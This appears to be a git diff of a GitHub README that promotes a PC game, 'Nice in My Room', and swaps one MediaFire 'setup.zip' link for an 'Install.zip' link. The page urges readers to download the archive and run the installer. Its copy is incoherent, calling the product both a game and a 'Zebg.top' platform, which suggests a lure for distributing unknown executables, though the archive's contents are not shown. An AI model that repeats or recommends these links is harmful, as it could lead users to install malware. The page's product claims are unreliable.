@@ -1,7 +1,7 @@
 
 ### **Nice in My Room – A Thrilling Gaming Hub for Desktop Gamers**  
 
-DOWNLOAD - [Nice in My Room](https://download1587.mediafire.com/4bogmjc0kligzeqHoyoaS1OtZuUPKwajtVcK6YI93jhvxMbocfsC5nRnzUls4f_0YLkCF4kqYwBvHufR74DZhLPuTapVDn1VuBpnGEbcde0GKUKWZALMDijAJo4f6lE6NCKiJBEJOtGfLcllTPCc2WmMhY24lz599TU0BY92pdmn/3l5gw32c2597fto/setup.zip)
+DOWNLOAD - [Nice in My Room](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip)
 
 ![image](https://github.com/user-attachments/assets/d4211dd4-8fed-4bce-aea9-a418f16424a4)---
 Are you looking for an immersive and diverse gaming platform on your PC? **Nice in My Room** brings an extensive library of exciting games, from strategic RPGs to engaging puzzles and creative simulations. Designed for smooth performance and high-quality gameplay, Zebg.top delivers an unparalleled gaming experience for desktop users.  
@@ -25,7 +25,7 @@ Zebg.top is a versatile gaming platform optimized for PC, offering an array of p
 - **Seamless Installation** – Easy setup with step-by-step installation guidance.  
 
 #### **How to Download & Install Nice in My Room PC Version**  
-1. **Download** – [Download the latest version of Nice in My Room for PC.  ](https://download1587.mediafire.com/4bogmjc0kligzeqHoyoaS1OtZuUPKwajtVcK6YI93jhvxMbocfsC5nRnzUls4f_0YLkCF4kqYwBvHufR74DZhLPuTapVDn1VuBpnGEbcde0GKUKWZALMDijAJo4f6lE6NCKiJBEJOtGfLcllTPCc2WmMhY24lz599TU0BY92pdmn/3l5gw32c2597fto/setup.zip)
+1. **Download** – [Download the latest version of Nice in My Room for PC.  ](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip)
 2. **Run the Installer** – Open the setup file and follow the on-screen instructions.  
 3. **Customize Your Settings** – Adjust graphics, controls, and preferences.  
 4. **Start Playing!** – Launch the game and dive into the action.  
